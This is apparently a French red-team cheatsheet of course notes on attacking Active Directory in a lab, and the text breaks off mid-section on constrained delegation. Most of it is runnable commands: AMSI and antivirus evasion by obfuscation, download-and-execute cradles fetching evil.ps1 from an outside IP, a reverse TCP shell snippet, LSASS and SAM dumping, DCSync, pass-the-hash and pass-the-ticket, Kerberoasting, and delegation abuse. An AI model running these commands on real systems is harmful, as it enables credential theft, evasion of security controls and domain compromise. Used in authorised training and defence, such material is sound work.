---
title: "Active Directory - Advanced Attack Notes"
date: 2026-03-27
draft: false
author: "keyll0ger"
description: "**Auteur**: Nikhil Mittal (@nikhil_mitt) **Objectif**: Compromettre un environnement Active Directory complexe multi-forêts sans exploits"
summary: "ActiveDirectory | Active Directory - Advanced Attack Notes"
tags:
  - "Active Directory"
  - "Kerberos"
  - "Red Team"
  - "Cheatsheet"
categories:
  - "Cheatsheet"
  - "ActiveDirectory"
ShowToc: true
TocOpen: false

cover:
  image: /images/covers/cheatsheet.svg
  alt: "cheatsheet"
  relative: false
---

## 📋 Vue d'ensemble du cours

**Auteur**: Nikhil Mittal (@nikhil_mitt)  
**Objectif**: Compromettre un environnement Active Directory complexe multi-forêts sans exploits  
**Méthode**: Assume Breach - Simulation d'attaquant interne avec foothold  
**Lab**: Environnement "Techcorp" (192.168.1.0/24 - 192.168.102.0/24)  
- Windows Server 2019 entièrement patchés
- Forest Functional Level 2016
- Multiple forests et domains
- Firewall minimal (focus sur les concepts)

---

## 🛠️ PHASE 0: CONFIGURATION & TOOLING

### Outils principaux

**PowerShell Modules & Scripts:**
- **ActiveDirectory Module** (MS Signed, fonctionne en CLM)
  ```powershell
  Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
  Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
  Get-Command -Module ActiveDirectory
  ```

- **PowerView** (Reconnaissance AD)
  ```powershell
  . C:\AD\Tools\PowerView.ps1
  ```

- **BloodHound** (Analyse de chemins d'attaque)
  - C# Collector: SharpHound
  - PowerShell Collector: Invoke-BloodHound

- **SharpView** (C# version de PowerView, pas de Pipeline filtering)

### Bypass PowerShell Security

#### 1. Execution Policy (NON une mesure de sécurité)
```powershell
powershell -ExecutionPolicy bypass
powershell -c <cmd>
powershell -encodedcommand <base64>
$env:PSExecutionPolicyPreference="bypass"
```

#### 2. Invisi-Shell (Bypass Logging, AMSI, CLM)
**Principe**: Hook .NET assemblies (System.Management.Automation.dll, System.Core.dll) via CLR Profiler API

```cmd
# Avec admin
RunWithPathAsAdmin.bat

# Sans admin  
RunWithRegistryNonAdmin.bat

# Toujours faire 'exit' pour cleanup
```

#### 3. Bypass AV Signatures - AMSITrigger
```powershell
# Identifier détections
AmsiTrigger_x64.exe -i C:\AD\Tools\script.ps1

# Méthodologie:
# 1. Scan avec AMSITrigger
# 2. Modifier code détecté
# 3. Rescan
# 4. Répéter jusqu'à "AMSI_RESULT_NOT_DETECTED"
```

**Techniques d'obfuscation:**

**PowerUp - Exemple:**
```powershell
# Ligne 59 détectée: System.AppDomain
$String = 'niamoDppA.metsyS'
$classrev = ([regex]::Matches($String,'.','RightToLeft') | ForEach {$_.value}) -join ''
$AppDomain = [Reflection.Assembly].Assembly.GetType("$classrev").GetProperty('CurrentDomain').GetValue($null, @())
```

**Invoke-PowerShellTcp - Exemple:**
```powershell
# Ligne 32 détectée: Net.Sockets
$String = "stekcoS.teN"
$class = ([regex]::Matches($String,'.','RightToLeft') | ForEach {$_.value}) -join ''
if ($Reverse) {
    $client = New-Object System.$class.TCPClient($IPAddress,$Port)
}
```

**Invoke-Mimikatz - Modifications requises:**
1. Supprimer commentaires
2. Modifier "DumpCreds" → "DC"
3. Modifier noms variables Win32 API: VirtualProtect, WriteProcessMemory, CreateRemoteThread
4. Reverser strings détectées + DLL compressée Mimikatz

### Download Execute Cradles

```powershell
# Méthode 1 - WebClient
iex (New-Object Net.WebClient).DownloadString('https://server/payload.ps1')

# Méthode 2 - IE COM Object
$ie=New-Object -ComObject InternetExplorer.Application
$ie.visible=$False
$ie.navigate('http://192.168.230.1/evil.ps1')
sleep 5
$response=$ie.Document.body.innerHTML
$ie.quit()
iex $response

# Méthode 3 - PSv3+ (Invoke-WebRequest)
iex (iwr 'http://192.168.230.1/evil.ps1')

# Méthode 4 - XMLHTTP COM
$h=New-Object -ComObject Msxml2.XMLHTTP
$h.open('GET','http://192.168.230.1/evil.ps1',$false)
$h.send()
iex $h.responseText

# Méthode 5 - WebRequest .NET
$wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```

---

## 🔍 PHASE 1: DOMAIN ENUMERATION

### Concepts clés AD

**Composants AD:**
- **Schema**: Définit objets et attributs
- **Query/Index Mechanism**: Recherche et publication objets
- **Global Catalog**: Info sur tous objets du directory
- **Replication Service**: Distribution info entre DCs

**Structure AD:**
- **Forest** = Security Boundary (peut contenir multiple domains)
- **Domain** (contient multiple OUs)
- **Organization Units (OUs)**

### Access Control Model (ACM)

**Components:**
1. **Access Tokens**: Contient user identity + group memberships
2. **Security Descriptors**: Owner + permissions

**Access Control List (ACL):**
- **DACL** (Discretionary ACL): Définit qui peut accéder
  - ACE (Access Control Entry): Défini permissions pour user/group
  
- **SACL** (System ACL): Logging des accès

**Permissions importantes:**
- **GenericAll**: Contrôle total
- **GenericWrite**: Modifier attributs
- **WriteOwner**: Changer ownership
- **WriteDACL**: Modifier permissions
- **AllExtendedRights**: Droits étendus (ex: force password change)
- **ForceChangePassword**: Reset password sans connaître ancien
- **Self**: Modifier membership (si sur groupe)

### Enumération de base

#### Domain Info
```powershell
# PowerView
Get-Domain
Get-Domain -Domain <domain_name>

# AD Module
Get-ADDomain
Get-ADDomain -Identity <domain>

# Récupérer SID
Get-DomainSID

# AD Module
(Get-ADDomain).DomainSID
```

#### Domain Controller
```powershell
# PowerView
Get-DomainController
Get-DomainController -Domain <domain>

# AD Module  
Get-ADDomainController
Get-ADDomainController -Identity <DC_name>
Get-ADDomainController -Discover -DomainName <domain>
```

#### Domain Policy
```powershell
# PowerView
Get-DomainPolicy
(Get-DomainPolicy)."system access"  # Password policy
(Get-DomainPolicy)."kerberos policy"

# AD Module
Get-ADDefaultDomainPasswordPolicy
```

#### Users
```powershell
# PowerView - Tous les users
Get-DomainUser
Get-DomainUser -Identity <username>
Get-DomainUser -Properties samaccountname, logoncount, badpwdcount
Get-DomainUser | select samaccountname, description, pwdlastset, logoncount

# Recherche attributs custom
Get-DomainUser -LDAPFilter "Description=*built*" | Select name,Description

# AD Module
Get-ADUser -Filter * -Properties *
Get-ADUser -Identity <user> -Properties *
Get-ADUser -Filter 'Description -like "*built*"' -Properties Description | select name,Description
```

#### Computers
```powershell
# PowerView
Get-DomainComputer
Get-DomainComputer -OperatingSystem "*Server 2019*"
Get-DomainComputer -Ping  # Actifs seulement
Get-DomainComputer -FullData

# AD Module
Get-ADComputer -Filter * -Properties *
Get-ADComputer -Filter 'OperatingSystem -like "*Server 2019*"' -Properties OperatingSystem
```

#### Groups
```powershell
# PowerView - Liste tous groupes
Get-DomainGroup
Get-DomainGroup -Identity "Domain Admins"
Get-DomainGroup -Identity "Domain Admins" -Properties *
Get-DomainGroup -Domain <targetdomain>

# Recherche wildcard
Get-DomainGroup *admin*

# AD Module
Get-ADGroup -Filter * -Properties *
Get-ADGroup -Filter 'Name -like "*admin*"' -Properties *
```

#### Group Membership
```powershell
# PowerView - Members d'un groupe
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Groups d'un user
Get-DomainGroup -UserName "student1"

# AD Module
Get-ADGroupMember -Identity "Domain Admins" -Recursive
Get-ADPrincipalGroupMembership -Identity student1
```

#### Local Groups (Machines)
```powershell
# PowerView - Local admins sur machine
Get-NetLocalGroup -ComputerName <servername>
Get-NetLocalGroupMember -ComputerName <servername> -GroupName Administrators

# Trouver machines où user est local admin (BRUYANT)
Find-LocalAdminAccess
```
⚠️ **Explication Find-LocalAdminAccess**: Teste accès admin sur TOUTES machines du domaine via appel WMI/RPC. Très détectable.

#### Shares
```powershell
# PowerView - Shares sur machine
Invoke-ShareFinder -Verbose
Invoke-ShareFinder -ComputerName <computer> -Verbose

# Shares intéressants (SYSVOL, fichiers sensibles)
Invoke-FileFinder -Verbose

# Fichiers sensibles
Get-NetFileServer  # File servers du domaine
```
⚠️ **Invoke-FileFinder**: Parcourt shares accessibles cherchant fichiers intéressants (*.config, web.config, *.xml, etc.). Peut être bruyan selon taille environnement.

### OUs (Organization Units)

```powershell
# PowerView
Get-DomainOU
Get-DomainOU -Identity <OU_name> -Properties *

# AD Module
Get-ADOrganizationalUnit -Filter * -Properties *
```

**Lister GPO appliquées à une OU:**
```powershell
# PowerView
(Get-DomainOU -Identity <OU>).gplink

# AD Module  
(Get-ADOrganizationalUnit -Filter 'Name -like "*OU_name*"').LinkedGroupPolicyObjects
```

### GPO (Group Policy Objects)

```powershell
# PowerView - Liste toutes GPO
Get-DomainGPO
Get-DomainGPO -Identity "{GPO_GUID}"
Get-DomainGPO -ComputerIdentity <computer_name>

# Recherche dans DisplayName
Get-DomainGPO | select displayname

# AD Module
Get-GPO -All
Get-GPO -Guid {GPO_GUID}
Get-GPResultantSetOfPolicy -Computer <computer_name>
```

**GPO utilisées pour Local Admin (Restricted Groups ou Group Policy Preferences):**
```powershell
# PowerView
Get-DomainGPOLocalGroup

# Find-GPOComputerAdmin - Trouve machines où user/group donné a admin via GPO
Find-GPOComputerAdmin -Identity <user>

# Find-GPOLocation - Trouve OUs où user/group a permissions via GPO  
Find-GPOLocation -UserName <user> -Verbose
```
⚠️ **Explication GPO Local Admin**: GPO peuvent définir local admins via "Restricted Groups" ou "Group Policy Preferences". Ces cmdlets détectent cette config.

### ACL (Access Control Lists)

```powershell
# PowerView - ACL d'un objet
Get-DomainObjectAcl -Identity <user> -ResolveGUIDs

# ACL pour préfixe (ex: tous admins)
Get-DomainObjectAcl -SearchBase "LDAP://CN=Domain Admins,CN=Users,DC=domain,DC=local" -ResolveGUIDs -Verbose

# ACL pour chemin LDAP
Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=domain,DC=local" -ResolveGUIDs

# AD Module
(Get-Acl 'AD:\CN=Administrator,CN=Users,DC=domain,DC=local').Access
```

**Recherche ACL intéressantes (Modify rights):**
```powershell
# PowerView - Trouve objets modifiables par user/group donné
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<username>"}

# AD Module
Get-Acl 'AD:\CN=Administrator,CN=Users,DC=domain,DC=local' | select -ExpandProperty Access | ?{$_.IdentityReference -match "<username>"}
```

⚠️ **Droits ACL critiques**:
- **GenericAll** = Full control (peut reset password, modifier attributs, etc.)
- **WriteDACL** = Peut modifier ACL (s'ajouter GenericAll)
- **WriteOwner** = Prendre ownership puis modifier ACL
- **ForceChangePassword** = Reset password user sans connaître l'ancien
- **Self (Self-Membership)** = S'ajouter à un groupe

**Exemple abus:**
```powershell
# Si WriteDACL sur user "student100"
Add-DomainObjectAcl -TargetIdentity student100 -PrincipalIdentity student1 -Rights ResetPassword -Verbose

# Puis reset password
$SecPassword = ConvertTo-SecureString 'Password@123' -AsPlainText -Force  
Set-DomainUserPassword -Identity student100 -AccountPassword $SecPassword -Verbose
```

### Trusts

#### Trust Direction
- **One-way trust** (Unidirectional): Users du trusted domain peuvent accéder ressources du trusting domain (mais PAS inverse)
  - `Domain A trusts Domain B` = Users de B peuvent accéder ressources de A
  
- **Two-way trust** (Bidirectional): Users des 2 domains peuvent accéder ressources de l'autre
  - Par défaut entre child domain et parent

#### Trust Transitivity
- **Transitive**: Si A trust B et B trust C, alors A trust C
  - Parent-Child trusts = toujours transitives
  - Tree-Root trusts = toujours transitives
  
- **Non-Transitive**: Limitée aux 2 domains
  - External trusts (entre forests) = par défaut non-transitive

#### Types de Trusts

**Parent-Child Trust:**
- Automatique entre parent et child domain
- Two-way, transitive

**Tree-Root Trust:**
- Entre root domains de différents trees dans même forest
- Two-way, transitive

**External Trust:**
- Entre domains de différents forests
- One-way ou two-way
- Non-transitive

**Forest Trust:**
- Entre forest roots
- One-way ou two-way  
- Transitive (mais seulement entre 2 forests, pas au-delà)

**Realm Trust:**
- Entre AD domain et non-Windows Kerberos realm (ex: Linux MIT Kerberos)

**Shortcut Trust:**
- Between domains d'une même forest pour optimiser authentification
- One-way ou two-way, transitive

#### Enumération Trusts

```powershell
# PowerView - Trusts du domain actuel
Get-DomainTrust
Get-DomainTrust -Domain <domain_name>

# AD Module
Get-ADTrust -Filter *
Get-ADTrust -Identity <domain>
```

#### Forest Enumeration

```powershell
# PowerView - Détails forest
Get-Forest
Get-Forest -Forest <forest_name>

# Lister tous domains de la forest
Get-ForestDomain
Get-ForestDomain -Forest <forest>

# Global Catalog pour forest
Get-ForestGlobalCatalog
Get-ForestGlobalCatalog -Forest <forest>

# AD Module
Get-ADForest
Get-ADForest -Identity <forest>
(Get-ADForest).Domains
```

**Forest Trust Mapping:**
```powershell
# PowerView - Trusts de toutes domains dans forest
Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -ne 'WITHIN_FOREST'}

# AD Module
Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
```

### User Hunting

**Objectif**: Trouver machines où users privilégiés sont logged (pour vol credentials)

```powershell
# PowerView - Trouver où Domain Admins sont logged
Find-DomainUserLocation -Verbose
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"

# Check si user a admin local
Test-AdminAccess -ComputerName <computer>

# AD Module (sessions utilisateur - requiert admin local)
Get-NetSession -ComputerName <server>
```

⚠️ **Find-DomainUserLocation méthode**:
1. Enumère tous computers du domain
2. Enumère Domain Admins (ou groupe spécifié)  
3. Pour chaque computer, vérifie sessions actives (Get-NetSession) 
4. Match sessions contre liste admins
**Très bruyant** - génère énormément requêtes réseau

**Alternative moins bruyante:**
```powershell
# Chercher seulement sur serveurs "high value"
Find-DomainUserLocation -Stealth
```
⚠️ **Stealth mode**: Query seulement File Servers, DC, Distributed File System servers (via Get-NetFileServer)

### BloodHound

**Collection de données:**
```powershell
# SharpHound (C#)
.\SharpHound.exe -c All
.\SharpHound.exe -c All,GPOLocalGroup  # Include GPO local group membership
.\SharpHound.exe --CollectionMethod All --Domain domain.local --LDAPUser user --LDAPPass password

# PowerShell Collector  
Invoke-BloodHound -CollectionMethod All -Verbose
Invoke-BloodHound -CollectionMethod All,GPOLocalGroup -Verbose
```

**Queries importantes dans BloodHound:**
- Shortest Paths to Domain Admins
- Find Principals with DCSync Rights
- Users with Foreign Domain Group Membership
- Shortest Paths to Unconstrained Delegation Systems
- Shortest Paths from Kerberoastable Users
- Shortest Paths to Domain Admins from Owned Principals (mark compromis users)

---

## 🔐 PHASE 2: LOCAL PRIVILEGE ESCALATION

### Services Issues avec PowerUp

```powershell
# Charger PowerUp
. C:\AD\Tools\PowerUp.ps1

# Check tous vecteurs d'escalation
Invoke-AllChecks

# Chercher services abusables
Get-ServiceUnquoted -Verbose  # Unquoted service paths
Get-ModifiableServiceFile -Verbose  # Modifiable service binaries
Get-ModifiableService -Verbose  # Services modifiables (permissions faibles)
```

**Abus Unquoted Service Path:**
```powershell
# Si service path = C:\Program Files\A Subfolder\B Subfolder\service.exe
# Windows cherche dans cet ordre:
# C:\Program.exe
# C:\Program Files\A.exe  
# C:\Program Files\A Subfolder\B.exe
# C:\Program Files\A Subfolder\B Subfolder\service.exe

# Exploit
Write-ServiceBinary -Name 'VulnSvc' -Path 'C:\Program Files\A.exe'
Restart-Service VulnSvc
```

**Abus Service Binary Modifiable:**
```powershell
# Replace service binary par payload
Write-ServiceBinary -Name 'VulnSvc' -Path 'C:\service\binary.exe'
Restart-Service VulnSvc
```

**Abus Service Permissions:**
```powershell
# Si permissions faibles (Start, Stop, ChangeConfig)
Invoke-ServiceAbuse -Name 'VulnSvc' -UserName 'domain\user' -Verbose

# Ou ajouter user à local admins
Invoke-ServiceAbuse -Name 'VulnSvc' -UserName 'domain\user' -LocalGroup 'Administrators'
```

### OU Delegation

**Concept**: Permissions déléguées sur OU permettant users non-admin de gérer objets spécifiques

**Enumération:**
```powershell
# PowerView - Check si control sur OU
Get-DomainObjectAcl -SearchBase "LDAP://OU=TargetOU,DC=domain,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match "<username>"}

# Check GenericAll sur computer dans OU
Get-DomainComputer -SearchBase "LDAP://OU=TargetOU,DC=domain,DC=local" | Get-DomainObjectAcl -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match "GenericAll"}
```

**Abus:**
```powershell
# Si GenericAll sur computer object
# Option 1: Resource-Based Constrained Delegation (voir section dédiée)

# Option 2: Shadow Credentials (requiert PKINIT)
# Ajouter msDS-KeyCredentialLink attribute
Whisker.exe add /target:<computer$> /domain:<domain> /dc:<dc>
Rubeus.exe asktgt /user:<computer$> /certificate:<base64cert> /password:<password> /domain:<domain> /dc:<dc> /ptt
```

### Restricted Groups via GPO

**Concept**: GPO peuvent définir membership de groupes locaux (ex: Administrators)

```powershell
# Enumération  
Get-DomainGPOLocalGroup -Verbose

# Trouver si user/group dans restricted groups avec admin
Get-DomainGPOLocalGroup | ?{$_.GPODisplayName -match "<keyword>"}
```

**Abus**: Si user membre d'un groupe qui est ajouté à local Admins via GPO, attendre GPO refresh ou forcer avec `gpupdate /force`

### Nested Local Groups

**Concept**: Domain groups peuvent être membres de local groups sur machines

**Enumération:**
```powershell
# PowerView - Local groups sur machine
Get-NetLocalGroupMember -ComputerName <server> -GroupName Administrators -Recurse

# Trouver machines où domain group est local admin
Find-LocalAdminAccess -Verbose
```

### LAPS (Local Administrator Password Solution)

**Concept**: Gestion centralisée passwords local administrator, stockés dans AD avec ACL

**Enumération:**
```powershell
# Check si LAPS installé  
Get-DomainComputer | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName

# AD Module
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwdExpirationTime | ? {$_."ms-Mcs-AdmPwdExpirationTime" -ne $null} | select name
```

**Abus - Lire password LAPS:**
```powershell
# PowerView - Si permissions lecture
Get-DomainComputer -Identity <computer> -Properties ms-Mcs-AdmPwd

# AD Module
Get-ADComputer -Identity <computer> -Properties ms-Mcs-AdmPwd | select ms-Mcs-AdmPwd
```

⚠️ **Explication**: Attribut `ms-Mcs-AdmPwd` contient password en clair. ACL par défaut permet seulement certain users/groups de lire (souvent Domain Admins + custom group). Enumérer ACL avec `Get-DomainObjectAcl`.

**Enumérer qui peut lire LAPS passwords:**
```powershell
# PowerView
Get-DomainObjectAcl -SearchBase "LDAP://OU=Servers,DC=domain,DC=local" -ResolveGUIDs | ?{($_.ObjectAceType -like "ms-Mcs-AdmPwd") -and ($_.ActiveDirectoryRights -match "ReadProperty")} | %{ConvertFrom-SID $_.SecurityIdentifier}
```

---

## 💀 PHASE 3: LATERAL MOVEMENT

### Extracting Credentials

#### Mimikatz - Dump LSASS

```powershell
# PowerShell (Invoke-Mimikatz)
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'

# Dump sur machine distante (requiert admin)
Invoke-Mimikatz -ComputerName <computer>

# Exfiltrer tickets
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

# SafetyKatz (Minidump puis parse offline)
SafetyKatz.exe "sekurlsa::logonpasswords"
```

⚠️ **SafetyKatz**: Utilise `MiniDumpWriteDump` API pour dump LSASS process dans fichier, puis parse offline. Moins détectable que Mimikatz direct car pas injection dans LSASS.

#### Alternatives à Mimikatz

**1. Comsvcs.dll (Technique native Windows):**
```powershell
# Obtenir PID lsass
tasklist /FI "IMAGENAME eq lsass.exe"

# Dump avec comsvcs.dll (méthode "legitime" de Windows)
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\temp\lsass.dmp full

# Parse offline
.\mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

⚠️ **Explication comsvcs.dll**: `comsvcs.dll` est une DLL Windows légitime contenant fonction `MiniDump` pour diagnostics COM+. Abus pour dump LSASS.

**2. ProcDump (Sysinternals - Signed MS):**
```powershell
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

**3. Dumpert (Direct Syscalls, bypass userland hooks):**
```powershell
.\Dumpert.exe
# Crée dump dans C:\Windows\Temp\dumpert.dmp
```

**4. PPLDump (LSASS en Protected Process):**
```powershell
# Si LSASS = PPL (Protected Process Light)
.\PPLdump.exe <lsass_pid> lsass.dmp
```

⚠️ **PPL (RunAsPPL)**: Quand activé, LSASS run en Protected Process, empêchant dump standard. PPLDump abuse driver légitime pour bypass.

**5. SharpDump:**
```cmd
.\SharpDump.exe
```

#### Extracting Credentials - Registry

```powershell
# SAM, SYSTEM, SECURITY hives
reg save HKLM\SAM C:\temp\sam.hive
reg save HKLM\SYSTEM C:\temp\system.hive  
reg save HKLM\SECURITY C:\temp\security.hive

# Parse avec Mimikatz
lsadump::sam /sam:sam.hive /system:system.hive

# Parse avec Impacket (secretsdump)
secretsdump.py -sam sam.hive -system system.hive -security security.hive LOCAL
```

#### DCSync Attack

**Concept**: Imiter DC et demander password hashes via Directory Replication Service Remote Protocol

**Permissions requises** (au moins un de):
- **Replicating Directory Changes** (DS-Replication-Get-Changes)
- **Replicating Directory Changes All** (DS-Replication-Get-Changes-All)  
- **Replicating Directory Changes in Filtered Set** (rare)
- Membership: Domain Admins, Enterprise Admins, Administrators

```powershell
# Mimikatz - Dump NTLM hash user spécifique
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\Administrator"'

# Dump tous users domain
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:domain.local /all"'

# Dump KRBTGT (pour Golden Ticket)
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
```

**Impacket secretsdump:**
```bash
secretsdump.py domain/user:password@dc_ip
secretsdump.py -hashes :ntlm_hash domain/user@dc_ip
secretsdump.py -just-dc-user administrator domain/user@dc_ip
```

⚠️ **Détection DCSync**: 
- Event ID 4662: Operation performed on object (Replication)
- Look for Accesses: "Replicating Directory Changes", "Replicating Directory Changes All"
- Source workstation ≠ Domain Controller = anomalie

**Enumérer qui a DCSync rights:**
```powershell
# PowerView
Get-DomainObjectAcl -SearchBase "DC=domain,DC=local" -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | %{$_.SecurityIdentifier} | Convert-SidToName
```

### Pass-The-Hash (PTH)

**Concept**: Utiliser NTLM hash au lieu de plaintext password pour s'authentifier

```powershell
# Mimikatz - PTH et spawn cmd
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:<hash> /run:cmd.exe"'

# SafetyKatz
SafetyKatz.exe "sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:<hash> /run:cmd.exe"
```

**Impacket (PSExec, WMIExec, etc.):**
```bash
psexec.py -hashes :ntlm_hash domain/administrator@target
wmiexec.py -hashes :ntlm_hash domain/administrator@target  
smbexec.py -hashes :ntlm_hash domain/administrator@target
```

### OverPass-The-Hash / Pass-The-Key

**Concept**: Utiliser NTLM/AES hash pour obtenir TGT Kerberos

```powershell
# Mimikatz - OverPTH avec NTLM
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:<hash> /run:powershell.exe"'

# OverPTH avec AES256 key (plus furtif)
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:domain.local /aes256:<aes_key> /run:powershell.exe"'
```

**Rubeus:**
```powershell
# ASKTGT avec hash
.\Rubeus.exe asktgt /user:Administrator /rc4:<ntlm_hash> /domain:domain.local /ptt

# ASKTGT avec AES256
.\Rubeus.exe asktgt /user:Administrator /aes256:<aes_key> /domain:domain.local /ptt
```

⚠️ **AES vs NTLM**: Authentification Kerberos avec AES keys génère moins alertes que NTLM (comportement "normal"). Downgrade à NTLM peut trigger détections.

**Extraire AES keys:**
```powershell
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
```

### Pass-The-Ticket (PTT)

**Concept**: Injecter ticket Kerberos volé dans session courante

```powershell
# Exporter tickets
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

# Injecter ticket (.kirbi)
Invoke-Mimikatz -Command '"kerberos::ptt C:\path\ticket.kirbi"'

# Rubeus
.\Rubeus.exe ptt /ticket:C:\path\ticket.kirbi

# Vérifier tickets chargés
klist
```

**Base64 ticket (Rubeus):**
```powershell
# Dump tickets en base64
.\Rubeus.exe dump

# PTT avec base64
.\Rubeus.exe ptt /ticket:<base64_ticket>
```

---

## ⚡ PHASE 4: DOMAIN PRIVILEGE ESCALATION

### Kerberoast

**Concept**: Requérir Service Ticket (TGS) pour SPN, crack hash offline pour récupérer password du service account

**Enumération SPNs:**
```powershell
# PowerView - Lister users avec SPN
Get-DomainUser -SPN

# AD Module
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

**Attack:**
```powershell
# PowerView - Request TGS pour tous SPNs
Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat

# AD Module + Mimikatz
Add-Type -AssemblyName System.IdentityModel
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} | %{New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.ServicePrincipalName}

# Exporter tickets
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Rubeus (output direct hashcat/john)
.\Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt
.\Rubeus.exe kerberoast /user:serviceaccount /format:hashcat
```

**Crack avec Hashcat:**
```bash
hashcat -m 13100 -a 0 hashes.txt wordlist.txt --force
# -m 13100 = TGS-REP (Kerberoast)
```

⚠️ **Explication**: TGS chiffré avec NTLM hash du service account. Si password faible = crackable offline sans alerter (pas bad password events).

**Targeted Kerberoast (requiert GenericWrite/GenericAll sur user):**
```powershell
# Set SPN sur user target (si n'en a pas)
Set-DomainObject -Identity <targetuser> -Set @{serviceprincipalname='fake/svc'}

# Kerberoast
.\Rubeus.exe kerberoast /user:<targetuser>

# Cleanup
Set-DomainObject -Identity <targetuser> -Clear serviceprincipalname
```

### AS-REP Roasting

**Concept**: Si user a "Do not require Kerberos preauthentication" enabled, on peut récupérer AS-REP contenant matériel crackable

**Enumération:**
```powershell
# PowerView - Users avec DONT_REQ_PREAUTH
Get-DomainUser -PreauthNotRequired -Verbose

# AD Module
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```

**Attack:**
```powershell
# Rubeus
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt

# Impacket
GetNPUsers.py domain.local/ -dc-ip <dc_ip> -usersfile users.txt -format hashcat -outputfile hashes.txt
GetNPUsers.py domain.local/user:password -dc-ip <dc_ip> -request
```

**Crack:**
```bash
hashcat -m 18200 -a 0 hashes.txt wordlist.txt --force
# -m 18200 = Kerberos 5 AS-REP
```

**Targeted AS-REP Roasting (requiert GenericWrite/GenericAll):**
```powershell
# Forcer DONT_REQ_PREAUTH sur target user
Set-DomainObject -Identity <targetuser> -XOR @{useraccountcontrol=4194304} -Verbose

# AS-REP Roast
.\Rubeus.exe asreproast /user:<targetuser> /format:hashcat

# Cleanup  
Set-DomainObject -Identity <targetuser> -XOR @{useraccountcontrol=4194304} -Verbose
```

### Unconstrained Delegation

**Concept**: Server avec Unconstrained Delegation peut impersonner N'IMPORTE QUEL user vers N'IMPORTE QUEL service. Quand user s'authentifie au serveur, TGT est envoyé et mis en cache.

**Enumération:**
```powershell
# PowerView - Computers avec Unconstrained Delegation
Get-DomainComputer -Unconstrained

# AD Module
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
```

**Attack - Compromission serveur Unconstrained:**
```powershell
# 1. Compromettre serveur avec Unconstrained Delegation (ex: serveur01)
# 2. Monitor pour TGT entrant
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

# 3. Si Domain Admin s'authentifie, TGT dans cache
# 4. Inject TGT
Invoke-Mimikatz -Command '"kerberos::ptt C:\path\admin_tgt.kirbi"'
```

⚠️ **Danger Unconstrained Delegation**: Si user privilégié (DA, EA) s'authentifie au serveur = instant compromission. Serveurs courants: IIS avec Windows Auth, Exchange, etc.

**Forcer authentification (Printer Bug):**
```powershell
# Rubeus - Monitor tickets
.\Rubeus.exe monitor /interval:5 /filteruser:DC01$

# Autre terminal - Trigger authentication DC vers serveur compromis
.\SpoolSample.exe DC01 SERVEUR01

# Capture TGT du DC machine account
# Avec DC$ TGT = DCSync possible
```

⚠️ **Explication Printer Bug (MS-RPRN)**:
- `SpoolSample.exe` (ou `printerbug.py`) abuse RPC Print Spooler
- Force machine cible (ex: DC) à s'authentifier vers attacker-controlled server
- Si serveur = Unconstrained Delegation, TGT capturé

### Constrained Delegation

**Concept**: Serveur peut impersonner users mais SEULEMENT vers services spécifiés

**Enumération:**
```powershell
# PowerView - Users/Computers avec Constrained Delegation
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# AD Module
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

**Méthode 1: Protocol Transition (T2A4D - TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION):**

Quand "Trust this user for delegation to specified services only" + "Use any authentication protocol" est coché:
- Permet S4U2Self (obtenir TGS forwardable pour n'importe quel user)
- Puis S4U2Proxy vers services autorisés

```powershell
# Enumération
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# AD Module
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation
```

**Attack avec Kekeo:**
```powershell
# 1. Obtenir TGT du service account avec constrained delegation
kekeo# tgt::ask /user:serviceaccount /domain:domain.local /rc4:<ntlm_hash>

# 2. S4U2Self - Obtenir TGS forwardable pour n'importe quel user (ex: Administrator)  
